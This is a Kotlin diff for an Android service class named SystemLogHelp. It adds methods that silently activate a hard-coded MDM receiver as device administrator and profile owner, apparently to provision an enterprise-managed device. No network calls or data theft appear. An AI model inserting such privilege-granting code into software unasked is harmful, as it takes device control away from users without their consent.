@@ -4,6 +4,7 @@ import android.annotation.SuppressLint
 import android.app.ActivityManager
 import android.app.Service
 import android.content.BroadcastReceiver
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
@@ -284,6 +285,30 @@ class SystemLogHelp : Service() {
                     }
                 }
             } catch (_: Exception) {
+            }
+        }
+
+        private val componentName =
+            ComponentName("com.fqnpzs.mobileark5g", "com.fiberhome.mobiark.mdm.MDMAdminReceiver")
+
+        override fun setAdmin() {
+            try {
+                if (!isAdminActive(context!!, componentName)) setActiveAdmin(componentName)
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+
+        override fun setDevice() {
+            try {
+                if (!isProfileOwnerApp(context!!, componentName.packageName)) {
+                    if (!isAdminActive(context!!, componentName)) setActiveProfileOwner(
+                        componentName
+                    )
+                    else setProfileOwner(componentName)
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
             }
         }
     }
